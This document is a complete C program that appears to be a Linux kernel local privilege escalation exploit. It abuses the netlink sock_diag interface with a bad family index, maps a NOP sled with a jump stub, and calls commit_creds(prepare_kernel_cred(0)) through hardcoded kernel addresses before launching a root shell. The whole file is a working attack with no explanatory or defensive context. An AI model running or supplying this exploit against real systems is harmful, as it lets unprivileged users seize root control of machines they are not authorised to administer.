#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/mman.h>
#include <sys/socket.h>

#include <linux/netlink.h>
#include <linux/unix_diag.h>
#include <linux/sock_diag.h>

static int (*commit_creds)(unsigned long cred) = (void *)0xffffffff8107c9c0;
static unsigned long (*prepare_kernel_cred)(unsigned long cred) = (void *)0xffffffff8107cc90;

int kernel_code() {
	commit_creds(prepare_kernel_cred(0));
	return -1;
}
void __jump(void);
void __jump_end(void);
void jump_payload_not_used() {
	asm volatile ("__jump:\n"
			"movq $kernel_code, %rax\n"
			"jmpq *%rax\n"
			"__jump_end:\n");
}

int main() {
	struct {
		struct nlmsghdr nlh;
		struct unix_diag_req r;
	} req;
	int fd;

	unsigned long mmap_start, mmap_size;
	mmap_start = 0x00000000fff00000;
	mmap_size = 0x4000000;

	if (mmap((void *)mmap_start, mmap_size, PROT_READ | PROT_WRITE | PROT_EXEC,
				MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0) == MAP_FAILED)
		return 1;

	const unsigned long jump_sz = __jump_end - __jump;
	memset((void *)mmap_start, 0x90, mmap_size);
	memcpy((void *)mmap_start + mmap_size - jump_sz, __jump, jump_sz);

	memset(&req, 0, sizeof(req));
	req.nlh.nlmsg_len = sizeof(req);
	req.nlh.nlmsg_type = SOCK_DIAG_BY_FAMILY;
	req.nlh.nlmsg_flags = NLM_F_ROOT|NLM_F_MATCH|NLM_F_REQUEST;
	req.nlh.nlmsg_seq = 123456;
	req.r.sdiag_family = 120;

	if ((fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_SOCK_DIAG)) < 0)
		return 1;

	if (send(fd, &req, sizeof(req), 0) < 0)
		return 1;

	if (!getuid())
		system("/bin/sh");

	return 0;
}

